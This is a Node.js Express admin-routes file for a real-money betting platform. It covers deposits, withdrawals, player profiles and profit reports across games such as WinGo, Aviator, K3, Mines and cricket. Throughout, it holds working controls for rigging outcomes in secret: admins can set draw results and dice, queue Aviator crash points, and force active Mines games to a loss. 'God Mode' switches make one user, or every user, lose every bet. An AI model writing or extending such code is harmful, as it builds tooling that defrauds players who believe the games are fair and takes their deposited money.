// ── routes/admin.js  v8.2 — cricket P&L + user profile ──
const express       = require('express');
const User          = require('../models/User');
const WingoRound    = require('../models/WingoRound');
const AviatorRound  = require('../models/AviatorRound');
const K3Round       = require('../models/K3Round');
const MinesGame     = require('../models/MinesGame');
const TrxWingoRound = require('../models/TrxWingoRound');
const FiveDRound    = require('../models/FiveDRound');
const SlotsGame     = require('../models/SlotsGame');
const Transaction   = require('../models/Transaction');
const CricketBet    = require('../models/CricketBet');   // ← NEW
const CricketMatch  = require('../models/CricketMatch'); // ← NEW
const { adminProtect } = require('../middleware/auth');
const { maybePayReferralReward, addDepositWager } = require('./wallet');

const NUM_COLOR={0:'Violet',1:'Green',2:'Red',3:'Green',4:'Red',5:'Violet',6:'Red',7:'Green',8:'Red',9:'Green'};

module.exports = function adminRoutes(io) {
  const router = express.Router();
  router.use(adminProtect);

  router.get('/stats', async (req, res) => {
    try {
      const [users,rounds,avRounds,txs,hp]=await Promise.all([
        User.countDocuments(),
        WingoRound.countDocuments({isResolved:true}),
        AviatorRound.countDocuments({phase:'crashed'}),
        Transaction.find({type:{$in:['deposit','withdraw']}}).sort({createdAt:-1}).limit(10000).lean(),
        WingoRound.aggregate([{$group:{_id:null,total:{$sum:'$houseProfit'}}}])
      ]);
      const totalDeposited=txs.filter(t=>t.type==='deposit').reduce((s,t)=>s+t.amount,0);
      const totalWithdrawn=txs.filter(t=>t.type==='withdraw'&&t.status==='success').reduce((s,t)=>s+t.amount,0);
      const pendingWithdraw=txs.filter(t=>t.type==='withdraw'&&t.status==='pending').length;
      const pendingDeposit=txs.filter(t=>t.type==='deposit'&&t.status==='pending').length;
      res.json({success:true,users,rounds,avRounds,totalDeposited,totalWithdrawn,pendingWithdraw,pendingDeposit,houseProfit:hp[0]?.total||0});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // WINGO
  router.get('/wingo/states',(req,res)=>res.json({success:true,states:req.app.locals.getAllWingoStates(),games:req.app.locals.WINGO_GAMES}));
  router.get('/wingo/current',(req,res)=>{const st=req.app.locals.getWingoState(req.query.gameId||'wingo3m');if(!st)return res.status(400).json({success:false,message:'Unknown gameId'});res.json({success:true,...st,gameId:req.query.gameId||'wingo3m'});});
  router.post('/wingo/result', async (req,res) => {
    try {
      const {periodId,result,gameId}=req.body; const r=parseInt(result);
      if (isNaN(r)||r<0||r>9) return res.status(400).json({success:false,message:'Result must be 0-9'});
      const gid=gameId||'wingo3m', st=req.app.locals.getWingoState(gid);
      let queued = false;
      if (st&&st.periodId===periodId) {
        if (st.sec>0) {
          // Round still running — queue the result for end of timer
          req.app.locals.setWingoAdminResult(gid,r);
          queued = true;
        } else {
          // Round already expired — settle immediately
          const round=await WingoRound.findOne({periodId});
          if (round&&!round.isResolved) await req.app.locals.settleWingoRound(gid,r,periodId);
        }
      }
      const settled=await WingoRound.findOne({periodId});
      if (queued) {
        // Round not settled yet — return current bets and note that profit will be available after round ends
        return res.json({
          success:true, result:r, color:NUM_COLOR[r], periodId,
          totalBets:settled?.totalBets||0, totalPayout:0,
          houseProfit:null,
          queued:true,
          message:`Result ${r} (${NUM_COLOR[r]}) queued — profit shown after round ends`
        });
      }
      res.json({success:true,result:r,color:NUM_COLOR[r],periodId,totalBets:settled?.totalBets||0,totalPayout:settled?.totalPayout||0,houseProfit:settled?.houseProfit||0,queued:false});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.get('/wingo/rounds', async (req,res) => {
    try{const rounds=await WingoRound.find(req.query.gameId?{gameId:req.query.gameId}:{}).sort({startedAt:-1}).limit(30).select('-bets');res.json({success:true,rounds});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // TRX WINGO
  router.get('/trxwingo/state',(req,res)=>{const st=req.app.locals.getTrxState?req.app.locals.getTrxState():{};res.json({success:true,...st});});
  router.post('/trxwingo/result',(req,res)=>{const r=parseInt(req.body.result);if(isNaN(r)||r<0||r>9)return res.status(400).json({success:false,message:'Result must be 0-9'});if(req.app.locals.setTrxAdminResult)req.app.locals.setTrxAdminResult(r);res.json({success:true,message:`TRX result set to ${r}`,});});
  router.get('/trxwingo/rounds', async (req,res) => {
    try{res.json({success:true,rounds:await TrxWingoRound.find({isResolved:true}).sort({resolvedAt:-1}).limit(20).select('-bets')});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // 5D
  router.get('/fived/state',(req,res)=>{const st=req.app.locals.getFiveDState?req.app.locals.getFiveDState():{};res.json({success:true,...st});});
  router.post('/fived/result',(req,res)=>{const {nums}=req.body;if(!Array.isArray(nums)||nums.length!==5||nums.some(n=>n<0||n>9))return res.status(400).json({success:false,message:'nums must be array of 5 digits 0-9'});if(req.app.locals.setFiveDAdminResult)req.app.locals.setFiveDAdminResult(nums.map(Number));res.json({success:true,nums,message:'5D result queued'});});
  router.get('/fived/rounds', async (req,res) => {
    try{res.json({success:true,rounds:await FiveDRound.find({isResolved:true}).sort({resolvedAt:-1}).limit(20).select('-bets')});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // AVIATOR
  router.get('/aviator/state',(req,res)=>{const av=req.app.locals.getAvState();res.json({success:true,phase:av.phase,mult:av.mult,countdown:av.countdown,periodId:av.periodId,queue:av.crashQueue||[]});});
  router.post('/aviator/set-crash',(req,res)=>{const v=parseFloat(req.body.crashAt);if(!v||v<1.01)return res.status(400).json({success:false,message:'crashAt must be >= 1.01'});req.app.locals.setAdminCrash(v);res.json({success:true,message:`Next crash set to ${v}x`});});

  // ── Pattern Queue ─────────────────────────────────────────────────────────
  router.get('/aviator/queue', (req, res) => {
    res.json({ success: true, queue: req.app.locals.getAvQueue(), length: req.app.locals.getAvQueue().length });
  });
  router.post('/aviator/queue/set', (req, res) => {
    const { queue } = req.body;
    if (!Array.isArray(queue)) return res.status(400).json({ success: false, message: 'queue must be an array' });
    if (queue.length > 100) return res.status(400).json({ success: false, message: 'Max 100 rounds in queue' });
    const invalid = queue.filter(v => isNaN(parseFloat(v)) || parseFloat(v) < 1.01);
    if (invalid.length) return res.status(400).json({ success: false, message: `Invalid values: ${invalid.join(', ')} — all must be ≥ 1.01` });
    req.app.locals.setAvQueue(queue);
    const saved = req.app.locals.getAvQueue();
    res.json({ success: true, message: `Pattern set: ${saved.length} rounds queued`, queue: saved });
  });
  router.post('/aviator/queue/clear', (req, res) => {
    req.app.locals.clearAvQueue();
    res.json({ success: true, message: 'Pattern queue cleared — back to random' });
  });
  router.post('/aviator/queue/append', (req, res) => {
    const { value } = req.body;
    const v = parseFloat(value);
    if (!v || v < 1.01) return res.status(400).json({ success: false, message: 'Value must be ≥ 1.01' });
    const q = req.app.locals.getAvQueue();
    if (q.length >= 100) return res.status(400).json({ success: false, message: 'Queue full (max 100)' });
    q.push(v);
    res.json({ success: true, message: `Added ${v}x — queue now ${q.length} rounds`, queue: q });
  });
  router.post('/aviator/queue/remove', (req, res) => {
    const { index } = req.body;
    const q = req.app.locals.getAvQueue();
    if (index < 0 || index >= q.length) return res.status(400).json({ success: false, message: 'Invalid index' });
    q.splice(index, 1);
    res.json({ success: true, message: `Removed entry — queue now ${q.length} rounds`, queue: q });
  });
  router.get('/aviator/rounds', async (req,res) => {
    try{res.json({success:true,rounds:await AviatorRound.find({phase:'crashed'}).sort({crashedAt:-1}).limit(20).select('-bets')});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // K3
  router.get('/k3/state',(req,res)=>{res.json({success:true,...req.app.locals.getK3State()});});
  router.post('/k3/result', async (req,res) => {
    try {
      const {dice}=req.body;
      if(!Array.isArray(dice)||dice.length!==3||dice.some(d=>d<1||d>6))return res.status(400).json({success:false,message:'dice must be array of 3 values 1-6'});
      const intDice=dice.map(Number); req.app.locals.setK3AdminDice(intDice);
      const st=req.app.locals.getK3State();
      if(!st.roundOpen||st.sec<=5){await req.app.locals.settleK3Round(intDice,st.periodId);req.app.locals.setK3AdminDice(null);return res.json({success:true,dice:intDice,sum:intDice.reduce((a,b)=>a+b,0),message:'Settled immediately'});}
      res.json({success:true,dice:intDice,sum:intDice.reduce((a,b)=>a+b,0),message:'Dice queued'});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.get('/k3/rounds', async (req,res) => {
    try{res.json({success:true,rounds:await K3Round.find({isResolved:true}).sort({startedAt:-1}).limit(20).select('-bets')});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // MINES
  router.get('/mines/sessions', async (req,res) => {
    try{
      const sessions=await MinesGame.find({status:'active'}).populate('userId','name phone').sort({createdAt:-1}).limit(50);
      res.json({success:true,sessions:sessions.map(s=>({_id:s._id,user:{name:s.userId?.name,phone:s.userId?.phone},betAmount:s.betAmount,minesCount:s.minesCount,revealed:s.revealed,currentMultiplier:s.currentMultiplier,createdAt:s.createdAt})),totalWon:await MinesGame.countDocuments({status:'won'}),totalLost:await MinesGame.countDocuments({status:'lost'})});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.post('/mines/force-end', async (req,res) => {
    try{
      const game=await MinesGame.findById(req.body.gameId);
      if(!game)return res.status(404).json({success:false,message:'Game not found'});
      if(game.status!=='active')return res.status(400).json({success:false,message:'Game not active'});
      game.status='lost';await game.save();
      io.to(String(game.userId)).emit('mines:force_ended',{gameId:req.body.gameId});
      res.json({success:true,message:'Session ended'});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // SLOTS
  router.get('/slots/stats', async (req,res) => {
    try{
      const [total,wins,agg]=await Promise.all([SlotsGame.countDocuments(),SlotsGame.countDocuments({won:true}),SlotsGame.aggregate([{$group:{_id:null,totalBet:{$sum:'$betAmount'},totalPrize:{$sum:'$prize'}}}])]);
      res.json({success:true,total,wins,losses:total-wins,totalBet:agg[0]?.totalBet||0,totalPrize:agg[0]?.totalPrize||0,houseProfit:(agg[0]?.totalBet||0)-(agg[0]?.totalPrize||0)});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.get('/slots/recent', async (req,res) => {
    try{res.json({success:true,games:await SlotsGame.find({won:true}).populate('userId','name phone').sort({createdAt:-1}).limit(20)});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // USERS
  router.get('/users', async (req,res) => {
    try{
      const page=parseInt(req.query.page)||1,limit=parseInt(req.query.limit)||20,q=String(req.query.q||'').trim();
      const filter=q?{$or:[{phone:{$regex:q}},{name:{$regex:q,$options:'i'}}]}:{};
      const [users,total]=await Promise.all([User.find(filter).select('-password').sort({createdAt:-1}).skip((page-1)*limit).limit(limit),User.countDocuments(filter)]);
      res.json({success:true,users,total,page});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.get('/users/:id', async (req,res) => {
    try{
      const user=await User.findById(req.params.id).select('-password');
      if(!user)return res.status(404).json({success:false,message:'Not found'});
      res.json({success:true,user,transactions:await Transaction.find({user:req.params.id}).sort({createdAt:-1}).limit(30)});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.post('/users/:id/block', async (req,res) => {
    try{
      const user=await User.findByIdAndUpdate(req.params.id,{isBlocked:req.body.block},{new:true}).select('-password');
      if(!user)return res.status(404).json({success:false,message:'User not found'});
      res.json({success:true,user});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // v29: God Mode toggle (per-user)
  router.post('/users/:id/godmode', async (req, res) => {
    try {
      const enable = req.body.enable === true || req.body.enable === 'true';
      const user = await User.findByIdAndUpdate(
        req.params.id,
        { godMode: enable },
        { new: true }
      ).select('-password');
      if (!user) return res.status(404).json({ success: false, message: 'User not found' });
      console.log(`[GodMode] ${enable ? '👿 ENABLED' : '✅ DISABLED'} for user ${user.name} (${user.phone})`);
      res.json({ success: true, godMode: user.godMode, message: `God Mode ${enable ? 'ENABLED — user will lose every bet' : 'disabled — back to normal'}` });
    } catch(e) { res.status(500).json({ success: false, message: 'Server error' }); }
  });

  // v30: Global God Mode — all users lose all bets
  router.post('/godmode/global', (req, res) => {
    const enable = req.body.enable === true || req.body.enable === 'true';
    req.app.locals.setGlobalGodMode(enable);
    res.json({ success: true, enabled: enable, message: enable ? '😈 GLOBAL GOD MODE ON — every user loses every bet' : '✅ Global God Mode OFF — back to normal' });
  });
  router.get('/godmode/global', (req, res) => {
    res.json({ success: true, enabled: req.app.locals.getGlobalGodMode() });
  });


  router.post('/users/:id/adjust', async (req,res) => {
    try{
      const delta=parseFloat(req.body.delta), note=String(req.body.note||'').trim();
      if(isNaN(delta)||delta===0)return res.status(400).json({success:false,message:'Invalid amount'});
      const user=await User.findById(req.params.id);
      if(!user)return res.status(404).json({success:false,message:'User not found'});
      if(delta<0&&user.balance+delta<0)return res.status(400).json({success:false,message:'Balance would go negative'});
      user.balance+=delta; if(delta>0)user.totalDeposited+=delta; await user.save();
      await Transaction.create({user:user._id,type:delta>0?'bonus':'withdraw',amount:Math.abs(delta),status:'success',note:note||`Admin ${delta>0?'credit':'debit'}: ${delta}`});
      res.json({success:true,newBalance:user.balance});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // WITHDRAWALS
  router.get('/withdrawals', async (req,res) => {
    try{res.json({success:true,withdrawals:await Transaction.find({type:'withdraw',status:req.query.status||'pending'}).populate('user','name phone').select('user amount status note withdrawUpi createdAt').sort({createdAt:-1}).limit(50)});}
    catch(e){res.status(500).json({success:false,message:'Server error'});}
  });
  router.post('/withdrawals/:id', async (req,res) => {
    try{
      const {status}=req.body;
      if(!['success','failed'].includes(status))return res.status(400).json({success:false,message:'Invalid status'});
      const tx=await Transaction.findById(req.params.id);
      if(!tx||tx.status!=='pending')return res.status(400).json({success:false,message:'Not found or already processed'});
      if(status==='failed') await User.findByIdAndUpdate(tx.user,{$inc:{balance:tx.amount,totalWithdrawn:-tx.amount}});
      tx.status=status; await tx.save();
      res.json({success:true,message:`Withdrawal ${status}`});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // DEPOSITS (manual UPI approval queue)
  router.get('/deposits', async (req, res) => {
    try {
      const status = String(req.query.status || 'pending');
      if (!['pending', 'success', 'failed'].includes(status))
        return res.status(400).json({ success: false, message: 'Invalid status' });
      const deposits = await Transaction.find({ type: 'deposit', status })
        .populate('user', 'name phone')
        .sort({ createdAt: -1 })
        .limit(50);
      res.json({ success: true, deposits });
    } catch (e) { res.status(500).json({ success: false, message: 'Server error' }); }
  });

  router.post('/deposits/:id', async (req, res) => {
    try {
      const { status } = req.body;
      if (!['success', 'failed'].includes(status))
        return res.status(400).json({ success: false, message: 'Invalid status' });

      const tx = await Transaction.findById(req.params.id);
      if (!tx || tx.type !== 'deposit' || tx.status !== 'pending')
        return res.status(400).json({ success: false, message: 'Not found or already processed' });

      if (status === 'failed') {
        tx.status = 'failed';
        tx.note = (tx.note ? tx.note + ' | ' : '') + 'Admin rejected deposit';
        await tx.save();
        return res.json({ success: true, message: 'Deposit rejected' });
      }

      // Approve deposit: credit wallet + optionally bonus, then mark tx success.
      const depositAmount = tx.amount;
      const bonus = depositAmount >= 500 ? Math.floor(depositAmount * 0.20) : 0;

      const user = await User.findByIdAndUpdate(
        tx.user,
        { $inc: { balance: depositAmount + bonus, totalDeposited: depositAmount } },
        { new: true }
      );
      if (!user) return res.status(404).json({ success: false, message: 'User not found' });

      tx.status = 'success';
      tx.note = (tx.note ? tx.note + ' | ' : '') + 'Admin approved deposit';
      await tx.save();

      if (bonus > 0) {
        await Transaction.create({
          user: user._id,
          type: 'bonus',
          amount: bonus,
          status: 'success',
          note: 'Deposit bonus 20% (admin-approved)',
        });
      }

      // Add deposit wager requirement (2× deposit amount)
      await addDepositWager(tx.user, depositAmount);
      // Pay referral reward if this user was referred and this is their first deposit ≥ ₹100
      await maybePayReferralReward(tx.user, depositAmount);

      res.json({ success: true, message: 'Deposit approved', newBalance: user.balance, bonus });
    } catch (e) { res.status(500).json({ success: false, message: 'Server error' }); }
  });

  // ANALYTICS
  router.get('/analytics', async (req,res) => {
    try{
      const today=new Date(new Date().setHours(0,0,0,0));
      const [dep,with_,users,rounds]=await Promise.all([
        Transaction.aggregate([{$match:{type:'deposit',createdAt:{$gte:today}}},{$group:{_id:null,total:{$sum:'$amount'}}}]),
        Transaction.aggregate([{$match:{type:'withdraw',status:'success',createdAt:{$gte:today}}},{$group:{_id:null,total:{$sum:'$amount'}}}]),
        User.countDocuments({createdAt:{$gte:today}}),
        WingoRound.countDocuments({isResolved:true,resolvedAt:{$gte:today}}),
      ]);
      res.json({success:true,today:{deposits:dep[0]?.total||0,withdrawals:with_[0]?.total||0,newUsers:users,rounds}});
    } catch(e){res.status(500).json({success:false,message:'Server error'});}
  });

  // ── LIVE ACTIVITY FEED ─────────────────────────────────────────────────────
  // Returns last N transactions of ALL types, enriched with user info
  router.get('/feed', async (req, res) => {
    try {
      const limit = Math.min(parseInt(req.query.limit)||80, 200);
      const txs = await Transaction.find({})
        .populate('user', 'name phone')
        .sort({ createdAt: -1 })
        .limit(limit)
        .lean();
      res.json({ success: true, feed: txs });
    } catch(e) { res.status(500).json({ success: false, message: 'Server error' }); }
  });

  // ── FULL PLAYER PROFILE — all bets across every game ──────────────────────
  router.get('/users/:id/profile', async (req, res) => {
    try {
      const uid = req.params.id;
      const user = await User.findById(uid).select('-password').lean();
      if (!user) return res.status(404).json({ success: false, message: 'Not found' });

      // All transactions
      const transactions = await Transaction.find({ user: uid }).sort({ createdAt: -1 }).limit(200).lean();

      // Bets from every round-based game
      const [wingoBets, trxBets, k3Bets, fdBets, avBets] = await Promise.all([
        WingoRound.find({ 'bets.userId': uid, isResolved: true })
          .sort({ resolvedAt: -1 }).limit(50)
          .select('periodId gameId result resultColor resolvedAt bets totalBets').lean(),
        TrxWingoRound.find({ 'bets.userId': uid, isResolved: true })
          .sort({ resolvedAt: -1 }).limit(50)
          .select('periodId result resultColor trxHash resolvedAt bets').lean(),
        K3Round.find({ 'bets.userId': uid, isResolved: true })
          .sort({ resolvedAt: -1 }).limit(50)
          .select('periodId dice sum resolvedAt bets').lean(),
        FiveDRound.find({ 'bets.userId': uid, isResolved: true })
          .sort({ resolvedAt: -1 }).limit(50)
          .select('periodId result resolvedAt bets').lean(),
        AviatorRound.find({ 'bets.userId': uid })
          .sort({ crashedAt: -1 }).limit(50)
          .select('periodId actualCrash crashedAt bets phase').lean(),
      ]);

      // Mines & Slots
      const [mines, slots] = await Promise.all([
        MinesGame.find({ userId: uid }).sort({ createdAt: -1 }).limit(30).lean(),
        SlotsGame.find({ userId: uid }).sort({ createdAt: -1 }).limit(30).lean(),
      ]);

      // Cricket bets
      const cricketBets = await CricketBet.find({ user: uid }).sort({ createdAt: -1 }).limit(50).lean();

      // Flatten bets to user's own bets only
      function extractMyBets(rounds, game, getResult) {
        const out = [];
        for (const r of rounds) {
          for (const b of (r.bets || [])) {
            if (String(b.userId) !== String(uid)) continue;
            out.push({ game, ...getResult(r, b) });
          }
        }
        return out;
      }

      const allBets = [
        ...extractMyBets(wingoBets, 'WinGo', (r, b) => ({
          periodId: r.periodId, subGame: r.gameId,
          choice: b.choice, amount: b.amount, odds: b.odds,
          won: b.won, payout: b.payout,
          result: `${r.result} (${r.resultColor})`, time: r.resolvedAt
        })),
        ...extractMyBets(trxBets, 'TRX WinGo', (r, b) => ({
          periodId: r.periodId, subGame: 'trxwingo',
          choice: b.choice, amount: b.amount, odds: b.odds,
          won: b.won, payout: b.payout,
          result: `${r.result} (${r.resultColor})`, time: r.resolvedAt
        })),
        ...extractMyBets(k3Bets, 'K3 Dice', (r, b) => ({
          periodId: r.periodId, subGame: 'k3',
          choice: b.choice, amount: b.amount, odds: b.odds,
          won: b.won, payout: b.payout,
          result: `[${(r.dice||[]).join(',')}] Sum:${r.sum}`, time: r.resolvedAt
        })),
        ...extractMyBets(fdBets, '5D', (r, b) => ({
          periodId: r.periodId, subGame: '5d',
          choice: `${b.betType}:${b.choice}`, amount: b.amount, odds: b.odds,
          won: b.won, payout: b.payout,
          result: (r.result||[]).join(''), time: r.resolvedAt
        })),
        ...extractMyBets(avBets, 'Aviator', (r, b) => ({
          periodId: r.periodId, subGame: 'aviator',
          choice: 'Bet', amount: b.amount, odds: b.cashedOut ? b.cashMult+'x' : '—',
          won: b.cashedOut, payout: b.payout||0,
          result: b.cashedOut ? `Cashed ${b.cashMult}x` : `Crashed ${r.actualCrash}x`,
          time: r.crashedAt
        })),
        ...mines.map(m => ({
          game: 'Mines', periodId: String(m._id), subGame: 'mines',
          choice: `${m.minesCount} mines`, amount: m.betAmount, odds: m.currentMultiplier+'x',
          won: m.status==='won', payout: m.payout||0,
          result: m.status, time: m.createdAt
        })),
        ...slots.map(s => ({
          game: 'Slots', periodId: String(s._id), subGame: 'slots',
          choice: 'Spin', amount: s.betAmount, odds: s.multiplier+'x',
          won: s.won, payout: s.prize||0,
          result: s.winLine||'No win', time: s.createdAt
        })),
        ...cricketBets.map(b => ({
          game: 'Cricket', periodId: String(b._id), subGame: b.marketType,
          choice: b.choiceLabel||b.choice, amount: b.amount, odds: b.odds+'x',
          won: b.status==='won', payout: b.payout||0,
          result: b.status==='won' ? `Won @ ${b.odds}x` : b.status==='lost' ? 'Lost' : b.status,
          time: b.createdAt,
          meta: { matchId: b.matchId, market: b.marketLabel },
        })),
      ].sort((a, b) => new Date(b.time) - new Date(a.time));

      // Stats
      const totalBetAmount = allBets.reduce((s, b) => s + b.amount, 0);
      const totalWonAmount = allBets.filter(b => b.won).reduce((s, b) => s + b.payout, 0);
      const winCount = allBets.filter(b => b.won).length;
      const winRate = allBets.length > 0 ? ((winCount / allBets.length) * 100).toFixed(1) : 0;
      const gameCounts = {};
      for (const b of allBets) gameCounts[b.game] = (gameCounts[b.game]||0) + 1;
      const favoriteGame = Object.entries(gameCounts).sort((a,b)=>b[1]-a[1])[0]?.[0] || '—';

      res.json({
        success: true, user, transactions,
        bets: allBets,
        stats: { totalBets: allBets.length, totalBetAmount, totalWonAmount, winRate, favoriteGame, winCount }
      });
    } catch(e) { console.error(e); res.status(500).json({ success: false, message: 'Server error' }); }
  });

  // ── GAME P&L BREAKDOWN ─────────────────────────────────────────────────────
  router.get('/pnl', async (req, res) => {
    try {
      const [wingo, trx, k3, fd, av, mines, slots] = await Promise.all([
        WingoRound.aggregate([{ $group: { _id: '$gameId', bets: { $sum: '$totalBets' }, payout: { $sum: '$totalPayout' }, rounds: { $sum: 1 } } }]),
        TrxWingoRound.aggregate([{ $group: { _id: null, bets: { $sum: '$totalBets' }, payout: { $sum: '$totalPayout' }, rounds: { $sum: 1 } } }]),
        K3Round.aggregate([{ $group: { _id: null, bets: { $sum: '$totalBets' }, payout: { $sum: '$totalPayout' }, rounds: { $sum: 1 } } }]),
        FiveDRound.aggregate([{ $group: { _id: null, bets: { $sum: '$totalBets' }, payout: { $sum: '$totalPayout' }, rounds: { $sum: 1 } } }]),
        AviatorRound.aggregate([{ $group: { _id: null, bets: { $sum: '$totalBets' }, payout: { $sum: '$totalPayout' }, rounds: { $sum: 1 } } }]),
        MinesGame.aggregate([{ $group: { _id: null, bets: { $sum: '$betAmount' }, payout: { $sum: '$payout' }, rounds: { $sum: 1 } } }]),
        SlotsGame.aggregate([{ $group: { _id: null, bets: { $sum: '$betAmount' }, payout: { $sum: '$prize' }, rounds: { $sum: 1 } } }]),
      ]);
      const games = [];
      for (const g of wingo) games.push({ game: 'WinGo ' + (g._id||''), bets: g.bets, payout: g.payout, profit: g.bets - g.payout, rounds: g.rounds });
      const simple = (label, arr) => { const g = arr[0]||{}; games.push({ game: label, bets: g.bets||0, payout: g.payout||0, profit: (g.bets||0)-(g.payout||0), rounds: g.rounds||0 }); };
      simple('TRX WinGo', trx); simple('K3 Dice', k3); simple('5D Lottery', fd);
      simple('Aviator', av); simple('Mines', mines); simple('Slots', slots);
      // Cricket P&L
      try {
        const cricketAgg = await CricketMatch.aggregate([{ $group: { _id: null, bets: { $sum: '$totalBetsAmount' }, payout: { $sum: '$totalPayout' }, rounds: { $sum: 1 } } }]);
        simple('Cricket', cricketAgg);
      } catch(e) {}
      res.json({ success: true, games });
    } catch(e) { res.status(500).json({ success: false, message: 'Server error' }); }
  });

  return router;
};
